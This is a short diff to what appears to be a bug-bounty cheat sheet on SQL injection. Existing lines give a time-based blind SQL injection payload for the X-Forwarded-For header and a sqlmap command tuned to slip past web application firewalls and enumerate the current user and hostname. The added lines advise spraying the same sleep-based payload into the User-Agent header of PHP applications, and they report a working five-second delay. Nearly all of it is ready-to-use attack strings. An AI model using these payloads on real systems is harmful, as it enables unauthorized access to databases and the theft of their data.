@@ -16,3 +16,12 @@ Tips : X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
 # waf bypass sqlmap
 
 * sqlmap -u “url” -p parameter --level 5 --risk 3 --dbms="MySQL" --random-agent --test-filter="boolean-based blind"  --current-user --hostname
+
+# sql injcetion tip
+
+Application was using php ( whenever I see php , I test sqli first ) 
+I tried blind sqli payload in login params  - not worked
+sprayed in user-agent - worked✅
+
+User-Agent: "XOR(if(now()=sysdate(),sleep(5),0))XOR"
+===> 5.xx seconds delay
